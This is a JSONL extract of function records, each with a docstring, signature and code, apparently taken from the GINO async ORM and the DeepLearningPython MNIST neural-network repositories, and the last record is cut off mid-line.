{"docstring": "\"\"\"Specify the ``on_clause`` for generating joined queries.\n\nThis is an experimental feature, used by :meth:`~get_from`.\n\n:param on_clause: An expression to feed into\n                  :func:`~sqlalchemy.sql.expression.join`.\n:return: ``self`` for chaining.\n\"\"\"\n\n", "func_signal": "def on(self, on_clause):\n", "code": "self.on_clause = on_clause\nreturn self", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Configure this loader to reuse instances that have the same values of all the\ngive columns.\n\n:param columns: Preferably :class:`~sqlalchemy.schema.Column` instances.\n:return: ``self`` for chaining.\n\"\"\"\n", "func_signal": "def distinct(self, *columns):\n", "code": "self._distinct = columns\nreturn self", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nCreates a server-side cursor in database for large query results.\n\nThis requires that there is a reusable connection in the current\ncontext, and an active transaction is present. Then its\n:meth:`.GinoConnection.iterate` is executed and returned.\n\n\"\"\"\n", "func_signal": "def iterate(self, clause, *multiparams, **params):\n", "code": "connection = self.current_connection\nif connection is None:\n    raise ValueError(\"No Connection in context, please provide one\")\nreturn connection.iterate(clause, *multiparams, **params)", "path": "gino/src/gino/engine.py", "commit_date": "2020-08-22 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "# noinspection PyProtectedMember\n", "func_signal": "def __init__(self, model, *args, **kwargs):\n", "code": "model._check_abstract()\nself.model = model\nself.alias = model.__table__.alias(*args, **kwargs)", "path": "gino/src/gino/crud.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "# none_as_none indicates that in the case of every column of the object is\n# None, whether a None or empty instance of the model should be returned.\n", "func_signal": "def _do_load(self, row, none_as_none):\n", "code": "values = dict((c.name, row[c]) for c in self.columns if c in row)\nif none_as_none and all((v is None) for v in values.values()):\n    return None\nrv = self.model()\nfor c in self.columns:\n    if c in row:\n        # noinspection PyProtectedMember\n        instance_key = self.model._column_name_map.invert_get(c.name)\n        rv.__values__[instance_key] = row[c]\nreturn rv", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Patches asyncio to support :mod:`contextvars`.\n\nThis is automatically called when :mod:`gino` is imported. If Python version is 3.7\nor greater, this function is a no-op.\n\"\"\"\n\n", "func_signal": "def patch_asyncio():\n", "code": "if not sys.version_info < (3, 7):\n    return\n\ndef _get_context():\n    state = _get_state()\n    ctx = getattr(state, \"context\", None)\n    if ctx is None:\n        ctx = contextvars.Context()\n        state.context = ctx\n    return ctx\n\ndef _set_context(ctx):\n    state = _get_state()\n    state.context = ctx\n\ndef _get_state():\n    loop = asyncio._get_running_loop()\n    if loop is None:\n        return contextvars._state\n    task = asyncio.Task.current_task(loop=loop)\n    return contextvars._state if task is None else task\n\ncontextvars._get_context = _get_context\ncontextvars._set_context = _set_context\n\ndef create_task(loop, coro):\n    task = loop._orig_create_task(coro)\n    if task._source_traceback:\n        del task._source_traceback[-1]\n    task.context = contextvars.copy_context()\n    return task\n\ndef _patch_loop(loop):\n    if loop and not hasattr(loop, \"_orig_create_task\"):\n        loop._orig_create_task = loop.create_task\n        loop.create_task = types.MethodType(create_task, loop)\n    return loop\n\ndef get_event_loop():\n    return _patch_loop(_get_event_loop())\n\ndef set_event_loop(loop):\n    return _set_event_loop(_patch_loop(loop))\n\ndef new_event_loop():\n    return _patch_loop(_new_event_loop())\n\n_get_event_loop = asyncio.get_event_loop\n_set_event_loop = asyncio.set_event_loop\n_new_event_loop = asyncio.new_event_loop\n\nasyncio.get_event_loop = asyncio.events.get_event_loop = get_event_loop\nasyncio.set_event_loop = asyncio.events.set_event_loop = set_event_loop\nasyncio.new_event_loop = asyncio.events.new_event_loop = new_event_loop", "path": "gino/src/gino/aiocontextvars.py", "commit_date": "2020-04-26 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Get current GINO version.\"\"\"\n\n", "func_signal": "def get_version():\n", "code": "try:\n    from importlib.metadata import version\nexcept ImportError:\n    from importlib_metadata import version\nreturn version(\"gino\")", "path": "gino/src/gino/__init__.py", "commit_date": "2020-09-17 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Automatically create a loader based on the type of the given value.\n\n+-------------------------------------------+--------------------------+\n| value type                                | loader type              |\n+===========================================+==========================+\n| :class:`tuple`                            | :class:`~TupleLoader`    |\n+-------------------------------------------+--------------------------+\n| :func:`callable`                          | :class:`~CallableLoader` |\n+-------------------------------------------+--------------------------+\n| :class:`~sqlalchemy.schema.Column`,       | :class:`~ColumnLoader`   |\n| :class:`~sqlalchemy.sql.expression.Label` |                          |\n+-------------------------------------------+--------------------------+\n| :class:`~gino.declarative.Model`          | :class:`~ModelLoader`    |\n+-------------------------------------------+--------------------------+\n| :class:`~gino.crud.Alias`                 | :class:`~AliasLoader`    |\n+-------------------------------------------+--------------------------+\n| :class:`~Loader`                          | as is                    |\n+-------------------------------------------+--------------------------+\n| any other types                           | :class:`~ValueLoader`    |\n+-------------------------------------------+--------------------------+\n\n:param value: Any supported value above.\n:return: A loader instance.\n\"\"\"\n", "func_signal": "def get(cls, value):\n", "code": "from .crud import Alias\n\nif isinstance(value, Loader):\n    rv = value\nelif isinstance(value, type) and issubclass(value, Model):\n    rv = ModelLoader(value)\nelif isinstance(value, Alias):\n    rv = AliasLoader(value)\nelif isinstance(value, Column):\n    rv = ColumnLoader(value)\nelif isinstance(value, Label):\n    rv = ColumnLoader(value.name)\nelif isinstance(value, tuple):\n    rv = TupleLoader(value)\nelif callable(value):\n    rv = CallableLoader(value)\nelse:\n    rv = ValueLoader(value)\nreturn rv", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "# FIXME: for MySQL, json string in WHERE clause needs to be cast to JSON type\n", "func_signal": "def _cast_json(column, value):\n", "code": "if isinstance(column.type, sa.JSON) or isinstance(\n    getattr(column.type, \"impl\", None), sa.JSON\n):\n    return sa.cast(value, sa.JSON)\nreturn value", "path": "gino/src/gino/crud.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nGenerate where-clause expression to locate this model instance.\n\nBy default this method uses current values of all primary keys, and you\ncan override it to behave differently. Most instance-level CRUD\noperations depend on this method internally. Particularly while\n:meth:`.lookup` is called in :meth:`.update`, the where condition is\nused in :meth:`.UpdateRequest.apply`, so that queries like ``UPDATE ...\nSET id = NEW WHERE id = OLD`` could work correctly.\n\n:return:\n\n.. versionadded:: 0.7.6\n\n\"\"\"\n", "func_signal": "def lookup(self):\n", "code": "exps = []\nfor c in self.__table__.primary_key.columns:\n    exps.append(c == getattr(self, self._column_name_map.invert_get(c.name)))\nif exps:\n    return sa.and_(*exps)\nelse:\n    raise LookupError(\n        \"Instance-level CRUD operations not allowed on \"\n        \"models without primary keys or lookup(), please\"\n        \" use model-level CRUD operations instead.\"\n    )", "path": "gino/src/gino/crud.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Interface used by GINO to run the loader.\n\n:param row: A :class:`~sqlalchemy.engine.RowProxy` instance.\n:param context: A :class:`dict` that is reused across all loaders in one query.\n:return: The model instance, followed by a boolean value indicating if the\n         result is distinct.\n\"\"\"\n\n", "func_signal": "def do_load(self, row, context):\n", "code": "if context is None:\n    context = {}\ndistinct = True\nif self._distinct:\n    ctx = context.setdefault(self._distinct, {})\n    key = tuple(row[col] for col in self._distinct)\n    rv = ctx.get(key, _none)\n    if rv is _none:\n        rv = self._do_load(row, context.get(_none_as_none, False))\n        ctx[key] = rv\n    else:\n        distinct = False\nelse:\n    rv = self._do_load(row, context.get(_none_as_none, False))\n\nif rv is None:\n    return None, None\nelse:\n    for key, value in self.extras.items():\n        context.setdefault(_none_as_none, True)\n        value, distinct_ = value.do_load(row, context)\n        # _none_as_none should not be propagated to parents\n        context.pop(_none_as_none, 0)\n        if distinct_ is None:\n            continue\n\n        if isinstance(getattr(self.model, key, None), types.FunctionType):\n            getattr(rv, key)(value)\n        else:\n            setattr(rv, key, value)\n    return rv, distinct", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nCreates a server-side cursor in database for large query results.\n\nCursors must work within transactions::\n\n    async with conn.transaction():\n        async for user in conn.iterate(User.query):\n            # handle each user without loading all users into memory\n\nAlternatively, you can manually control how the cursor works::\n\n    async with conn.transaction():\n        cursor = await conn.iterate(User.query)\n        user = await cursor.next()\n        users = await cursor.many(10)\n\nRead more about how :class:`~gino.dialects.base.Cursor` works.\n\nSimilarly, this method takes the same parameters as :meth:`all`.\n\n\"\"\"\n", "func_signal": "def iterate(self, clause, *multiparams, **params):\n", "code": "result = self._execute(clause, multiparams, params)\nreturn result.iterate()", "path": "gino/src/gino/engine.py", "commit_date": "2020-08-22 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nBorrows a new connection and starts a transaction with it.\n\nDifferent to :meth:`.GinoConnection.transaction`, transaction on engine\nlevel supports only managed usage::\n\n    async with engine.transaction() as tx:\n        # play with transaction here\n\nWhere the implicitly acquired connection is available as\n:attr:`tx.connection <gino.transaction.GinoTransaction.connection>`.\n\nBy default, :meth:`.transaction` acquires connection with\n``reuse=True`` and ``reusable=True``, that means it by default tries to\ncreate a nested transaction instead of a new transaction on a new\nconnection. You can change the default behavior by setting these two\narguments.\n\nThe other arguments are the same as\n:meth:`~.GinoConnection.transaction` on connection.\n\n.. seealso::\n\n    :meth:`.GinoEngine.acquire`\n\n    :meth:`.GinoConnection.transaction`\n\n    :class:`~gino.transaction.GinoTransaction`\n\n:return: A asynchronous context manager that yields a\n  :class:`~gino.transaction.GinoTransaction`\n\n\"\"\"\n", "func_signal": "def transaction(self, *args, timeout=None, reuse=True, reusable=True, **kwargs):\n", "code": "return _TransactionContext(\n    self.acquire(timeout=timeout, reuse=reuse, reusable=reusable),\n    (args, kwargs),\n)", "path": "gino/src/gino/engine.py", "commit_date": "2020-08-22 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Generate a query from this loader.\n\nThis is an experimental feature, not all loaders support this.\n\n:return: A query instance with the ``loader`` execution option set to self.\n\"\"\"\n", "func_signal": "def query(self):\n", "code": "rv = select(self.get_columns())\nfrom_clause = self.get_from()\nif from_clause is not None:\n    rv = rv.select_from(from_clause)\nreturn rv.execution_options(loader=self)", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nGets the most recently acquired reusable connection in the context.\n``None`` if there is no such connection.\n\n:return: :class:`.GinoConnection`\n\n\"\"\"\n", "func_signal": "def current_connection(self):\n", "code": "stack = self._ctx.get()\nif stack:\n    return stack[-1].gino_conn", "path": "gino/src/gino/engine.py", "commit_date": "2020-08-22 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nShortcut for :func:`sqlalchemy.create_engine` with ``strategy=\"gino\"``.\n\n.. versionchanged:: 1.1\n   Added the ``bakery`` keyword argument, please see :class:`~.bakery.Bakery`.\n\n.. versionchanged:: 1.1\n   Added the ``prebake`` keyword argument to choose when to create the prepared\n   statements for the queries in the bakery:\n\n   * **Pre-bake** immediately when connected to the database (default).\n   * No **pre-bake** but create prepared statements lazily when needed for the first\n     time.\n\n   Note: ``prebake`` has no effect in aiomysql\n\"\"\"\n\n", "func_signal": "def create_engine(*args, **kwargs):\n", "code": "from sqlalchemy import create_engine\n\nkwargs.setdefault(\"strategy\", \"gino\")\nreturn create_engine(*args, **kwargs)", "path": "gino/src/gino/__init__.py", "commit_date": "2020-09-17 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Return the output of the network if ``a`` is input.\"\"\"\n", "func_signal": "def feedforward(self, a):\n", "code": "for b, w in zip(self.biases, self.weights):\n    a = sigmoid(np.dot(w, a)+b)\nreturn a", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return a tuple containing ``(training_data, validation_data,\ntest_data)``. Based on ``load_data``, but the format is more\nconvenient for use in our implementation of neural networks.\nIn particular, ``training_data`` is a list containing 50,000\n2-tuples ``(x, y)``.  ``x`` is a 784-dimensional numpy.ndarray\ncontaining the input image.  ``y`` is a 10-dimensional\nnumpy.ndarray representing the unit vector corresponding to the\ncorrect digit for ``x``.\n``validation_data`` and ``test_data`` are lists containing 10,000\n2-tuples ``(x, y)``.  In each case, ``x`` is a 784-dimensional\nnumpy.ndarry containing the input image, and ``y`` is the\ncorresponding classification, i.e., the digit values (integers)\ncorresponding to ``x``.\nObviously, this means we're using slightly different formats for\nthe training data and the validation / test data.  These formats\nturn out to be the most convenient for use in our neural network\ncode.\"\"\"\n", "func_signal": "def load_data_wrapper():\n", "code": "tr_d, va_d, te_d = load_data()\ntraining_inputs = [np.reshape(x, (784, 1)) for x in tr_d[0]]\ntraining_results = [vectorized_result(y) for y in tr_d[1]]\ntraining_data = zip(training_inputs, training_results)\nvalidation_inputs = [np.reshape(x, (784, 1)) for x in va_d[0]]\nvalidation_data = zip(validation_inputs, va_d[1])\ntest_inputs = [np.reshape(x, (784, 1)) for x in te_d[0]]\ntest_data = zip(test_inputs, te_d[1])\nreturn (training_data, validation_data, test_data)", "path": "DeepLearningPython/mnist_loader.py", "commit_date": "2016-07-29 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return a 10-dimensional unit vector with a 1.0 in the jth\nposition and zeroes elsewhere.  This is used to convert a digit\n(0...9) into a corresponding desired output from the neural\nnetwork.\"\"\"\n", "func_signal": "def vectorized_result(j):\n", "code": "e = np.zeros((10, 1))\ne[j] = 1.0\nreturn e", "path": "DeepLearningPython/mnist_loader.py", "commit_date": "2016-07-29 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return a tuple ``(nabla_b, nabla_w)`` representing the\ngradient for the cost function C_x.  ``nabla_b`` and\n``nabla_w`` are layer-by-layer lists of numpy arrays, similar\nto ``self.biases`` and ``self.weights``.\"\"\"\n", "func_signal": "def backprop(self, x, y):\n", "code": "nabla_b = [np.zeros(b.shape) for b in self.biases]\nnabla_w = [np.zeros(w.shape) for w in self.weights]\n# feedforward\nactivation = x\nactivations = [x] # list to store all the activations, layer by layer\nzs = [] # list to store all the z vectors, layer by layer\nfor b, w in zip(self.biases, self.weights):\n    z = np.dot(w, activation)+b\n    zs.append(z)\n    activation = sigmoid(z)\n    activations.append(activation)\n# backward pass\ndelta = (self.cost).delta(zs[-1], activations[-1], y)\nnabla_b[-1] = delta\nnabla_w[-1] = np.dot(delta, activations[-2].transpose())\n# Note that the variable l in the loop below is used a little\n# differently to the notation in Chapter 2 of the book.  Here,\n# l = 1 means the last layer of neurons, l = 2 is the\n# second-last layer, and so on.  It's a renumbering of the\n# scheme in the book, used here to take advantage of the fact\n# that Python can use negative indices in lists.\nfor l in range(2, self.num_layers):\n    z = zs[-l]\n    sp = sigmoid_prime(z)\n    delta = np.dot(self.weights[-l+1].transpose(), delta) * sp\n    nabla_b[-l] = delta\n    nabla_w[-l] = np.dot(delta, activations[-l-1].transpose())\nreturn (nabla_b, nabla_w)", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the digit whose average darkness in the training data is\nclosest to the darkness of ``image``.  Note that ``avgs`` is\nassumed to be a defaultdict whose keys are 0...9, and whose values\nare the corresponding average darknesses across the training data.\"\"\"\n", "func_signal": "def guess_digit(image, avgs):\n", "code": "darkness = sum(image)\ndistances = {k: abs(v-darkness) for k, v in avgs.items()}\nreturn min(distances, key=distances.get)", "path": "DeepLearningPython/mnist_average_darkness.py", "commit_date": "2017-02-04 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the total cost for the data set ``data``.  The flag\n``convert`` should be set to False if the data set is the\ntraining data (the usual case), and to True if the data set is\nthe validation or test data.  See comments on the similar (but\nreversed) convention for the ``accuracy`` method, above.\n\"\"\"\n", "func_signal": "def total_cost(self, data, lmbda, convert=False):\n", "code": "cost = 0.0\nfor x, y in data:\n    a = self.feedforward(x)\n    if convert: y = vectorized_result(y)\n    cost += self.cost.fn(a, y)/len(data)\n    cost += 0.5*(lmbda/len(data))*sum(np.linalg.norm(w)**2 for w in self.weights) # '**' - to the power of.\nreturn cost", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the MNIST data as a tuple containing the training data,\nthe validation data, and the test data.\nThe ``training_data`` is returned as a tuple with two entries.\nThe first entry contains the actual training images.  This is a\nnumpy ndarray with 50,000 entries.  Each entry is, in turn, a\nnumpy ndarray with 784 values, representing the 28 * 28 = 784\npixels in a single MNIST image.\nThe second entry in the ``training_data`` tuple is a numpy ndarray\ncontaining 50,000 entries.  Those entries are just the digit\nvalues (0...9) for the corresponding images contained in the first\nentry of the tuple.\nThe ``validation_data`` and ``test_data`` are similar, except\neach contains only 10,000 images.\nThis is a nice data format, but for use in neural networks it's\nhelpful to modify the format of the ``training_data`` a little.\nThat's done in the wrapper function ``load_data_wrapper()``, see\nbelow.\n\"\"\"\n", "func_signal": "def load_data():\n", "code": "f = gzip.open('mnist.pkl.gz', 'rb')\ntraining_data, validation_data, test_data = pickle.load(f, encoding=\"latin1\")\nf.close()\nreturn (training_data, validation_data, test_data)", "path": "DeepLearningPython/mnist_loader.py", "commit_date": "2016-07-29 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Initialize the weights using a Gaussian distribution with mean 0\nand standard deviation 1.  Initialize the biases using a\nGaussian distribution with mean 0 and standard deviation 1.\n\nNote that the first layer is assumed to be an input layer, and\nby convention we won't set any biases for those neurons, since\nbiases are only ever used in computing the outputs from later\nlayers.\n\nThis weight and bias initializer uses the same approach as in\nChapter 1, and is included for purposes of comparison.  It\nwill usually be better to use the default weight initializer\ninstead.\n\n\"\"\"\n", "func_signal": "def large_weight_initializer(self):\n", "code": "self.biases = [np.random.randn(y, 1) for y in self.sizes[1:]]\nself.weights = [np.random.randn(y, x)\n                for x, y in zip(self.sizes[:-1], self.sizes[1:])]", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the number of test inputs for which the neural\nnetwork outputs the correct result. Note that the neural\nnetwork's output is assumed to be the index of whichever\nneuron in the final layer has the highest activation.\"\"\"\n", "func_signal": "def evaluate(self, test_data):\n", "code": "test_results = [(np.argmax(self.feedforward(x)), y)\n                for (x, y) in test_data]\nreturn sum(int(x == y) for (x, y) in test_results)", "path": "DeepLearningPython/network.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return a tuple ``(nabla_b, nabla_w)`` representing the\ngradient for the cost function C_x.  ``nabla_b`` and\n``nabla_w`` are layer-by-layer lists of numpy arrays, similar\nto ``self.biases`` and ``self.weights``.\"\"\"\n", "func_signal": "def backprop(self, x, y):\n", "code": "nabla_b = [np.zeros(b.shape) for b in self.biases]\nnabla_w = [np.zeros(w.shape) for w in self.weights]\n# feedforward\nactivation = x\nactivations = [x] # list to store all the activations, layer by layer\nzs = [] # list to store all the z vectors, layer by layer\nfor b, w in zip(self.biases, self.weights):\n    z = np.dot(w, activation)+b\n    zs.append(z)\n    activation = sigmoid(z)\n    activations.append(activation)\n# backward pass\ndelta = self.cost_derivative(activations[-1], y) * \\\n    sigmoid_prime(zs[-1])\nnabla_b[-1] = delta\nnabla_w[-1] = np.dot(delta, activations[-2].transpose())\n# Note that the variable l in the loop below is used a little\n# differently to the notation in Chapter 2 of the book.  Here,\n# l = 1 means the last layer of neurons, l = 2 is the\n# second-last layer, and so on.  It's a renumbering of the\n# scheme in the book, used here to take advantage of the fact\n# that Python can use negative indices in lists.\nfor l in range(2, self.num_layers):\n    z = zs[-l]\n    sp = sigmoid_prime(z)\n    delta = np.dot(self.weights[-l+1].transpose(), delta) * sp\n    nabla_b[-l] = delta\n    nabla_w[-l] = np.dot(delta, activations[-l-1].transpose())\nreturn (nabla_b, nabla_w)", "path": "DeepLearningPython/network.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"The list ``sizes`` contains the number of neurons in the respective\nlayers of the network.  For example, if the list was [2, 3, 1]\nthen it would be a three-layer network, with the first layer\ncontaining 2 neurons, the second layer 3 neurons, and the\nthird layer 1 neuron.  The biases and weights for the network\nare initialized randomly, using\n``self.default_weight_initializer`` (see docstring for that\nmethod).\n\n\"\"\"\n", "func_signal": "def __init__(self, sizes, cost=CrossEntropyCost):\n", "code": "self.num_layers = len(sizes)\nself.sizes = sizes\nself.default_weight_initializer()\nself.cost=cost", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the number of inputs in ``data`` for which the neural\nnetwork outputs the correct result. The neural network's\noutput is assumed to be the index of whichever neuron in the\nfinal layer has the highest activation.\n\nThe flag ``convert`` should be set to False if the data set is\nvalidation or test data (the usual case), and to True if the\ndata set is the training data. The need for this flag arises\ndue to differences in the way the results ``y`` are\nrepresented in the different data sets.  In particular, it\nflags whether we need to convert between the different\nrepresentations.  It may seem strange to use different\nrepresentations for the different data sets.  Why not use the\nsame representation for all three data sets?  It's done for\nefficiency reasons -- the program usually evaluates the cost\non the training data and the accuracy on other data sets.\nThese are different types of computations, and using different\nrepresentations speeds things up.  More details on the\nrepresentations can be found in\nmnist_loader.load_data_wrapper.\n\n\"\"\"\n", "func_signal": "def accuracy(self, data, convert=False):\n", "code": "if convert:\n    results = [(np.argmax(self.feedforward(x)), np.argmax(y))\n               for (x, y) in data]\nelse:\n    results = [(np.argmax(self.feedforward(x)), y)\n                for (x, y) in data]\n\nresult_accuracy = sum(int(x == y) for (x, y) in results)\nreturn result_accuracy", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\" Return a defaultdict whose keys are the digits 0 through 9.\nFor each digit we compute a value which is the average darkness of\ntraining images containing that digit.  The darkness for any\nparticular image is just the sum of the darknesses for each pixel.\"\"\"\n", "func_signal": "def avg_darknesses(training_data):\n", "code": "digit_counts = defaultdict(int)\ndarknesses = defaultdict(float)\nfor image, digit in zip(training_data[0], training_data[1]):\n    digit_counts[digit] += 1\n    darknesses[digit] += sum(image)\navgs = defaultdict(float)\nfor digit, n in digit_counts.items():\n    avgs[digit] = darknesses[digit] / n\nreturn avgs", "path": "DeepLearningPython/mnist_average_darkness.py", "commit_date": "2017-02-04 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"The list ``sizes`` contains the number of neurons in the\nrespective layers of the network.  For example, if the list\nwas [2, 3, 1] then it would be a three-layer network, with the\nfirst layer containing 2 neurons, the second layer 3 neurons,\nand the third layer 1 neuron.  The biases and weights for the\nnetwork are initialized randomly, using a Gaussian\ndistribution with mean 0, and variance 1.  Note that the first\nlayer is assumed to be an input layer, and by convention we\nwon't set any biases for those neurons, since biases are only\never used in computing the outputs from later layers.\"\"\"\n", "func_signal": "def __init__(self, sizes):\n", "code": "self.num_layers = len(sizes)\nself.sizes = sizes\nself.biases = [np.random.randn(y, 1) for y in sizes[1:]]\nself.weights = [np.random.randn(y, x)\n                for x, y in zip(sizes[:-1], sizes[1:])]", "path": "DeepLearningPython/network.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Load a neural network from the file ``filename``.  Returns an\ninstance of Network.\n\n\"\"\"\n", "func_signal": "def load(filename):\n", "code": "f = open(filename, \"r\")\ndata = json.load(f)\nf.close()\ncost = getattr(sys.modules[__name__], data[\"cost\"])\nnet = Network(data[\"sizes\"], cost=cost)\nnet.weights = [np.array(w) for w in data[\"weights\"]]\nnet.biases = [np.array(b) for b in data[\"biases\"]]\nreturn net", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return a 10-dimensional unit vector with a 1.0 in the j'th position\nand zeroes elsewhere.  This is used to convert a digit (0...9)\ninto a corresponding desired output from the neural network.\n\n\"\"\"\n", "func_signal": "def vectorized_result(j):\n", "code": "e = np.zeros((10, 1))\ne[j] = 1.0\nreturn e", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Return the output of the network if ``a`` is input.\"\"\"\n", "func_signal": "def feedforward(self, a):\n", "code": "for b, w in zip(self.biases, self.weights):\n    a = sigmoid(np.dot(w, a)+b)\nreturn a", "path": "DeepLearningPython/network.py", "commit_date": "2020-10-23 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Initialize each weight using a Gaussian distribution with mean 0\nand standard deviation 1 over the square root of the number of\nweights connecting to the same neuron.  Initialize the biases\nusing a Gaussian distribution with mean 0 and standard\ndeviation 1.\n\nNote that the first layer is assumed to be an input layer, and\nby convention we won't set any biases for those neurons, since\nbiases are only ever used in computing the outputs from later\nlayers.\n\n\"\"\"\n", "func_signal": "def default_weight_initializer(self):\n", "code": "self.biases = [np.random.randn(y, 1) for y in self.sizes[1:]]\nself.weights = [np.random.randn(y, x)/np.sqrt(x)\n                for x, y in zip(self.sizes[:-1], self.sizes[1:])]", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Save the neural network to the file ``filename``.\"\"\"\n", "func_signal": "def save(self, filename):\n", "code": "data = {\"sizes\": self.sizes,\n        \"weights\": [w.tolist() for w in self.weights],\n        \"biases\": [b.tolist() for b in self.biases],\n        \"cost\": str(self.cost.__name__)}\nf = open(filename, \"w\")\njson.dump(data, f)\nf.close()", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", "stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"Update the network's weights and biases by applying gradient\ndescent using backpropagation to a single mini batch.  The\n``mini_batch`` is a list of tuples ``(x, y)``, ``eta`` is the\nlearning rate, ``lmbda`` is the regularization parameter, and\n``n`` is the total size of the training data set.\n\n\"\"\"\n", "func_signal": "def update_mini_batch(self, mini_batch, eta, lmbda, n):\n", "code": "nabla_b = [np.zeros(b.shape) for b in self.biases]\nnabla_w = [np.zeros(w.shape) for w in self.weights]\nfor x, y in mini_batch:\n    delta_nabla_b, delta_nabla_w = self.backprop(x, y)\n    nabla_b = [nb+dnb for nb, dnb in zip(nabla_b, delta_nabla_b)]\n    nabla_w = [nw+dnw for nw, dnw in zip(nabla_w, delta_nabla_w)]\nself.weights = [(1-eta*(lmbda/n))*w-(eta/len(mini_batch))*nw\n                for w, nw in zip(self.weights, nabla_w)]\nself.biases = [b-(eta/len(mini_batch))*nb\n               for b, nb in zip(self.biases, nabla_b)]", "path": "DeepLearningPython/network2.py", "commit_date": "2016-09-09 00:00:00", "repo_name": "MichalDanielDobrzanski/DeepLearningPython", 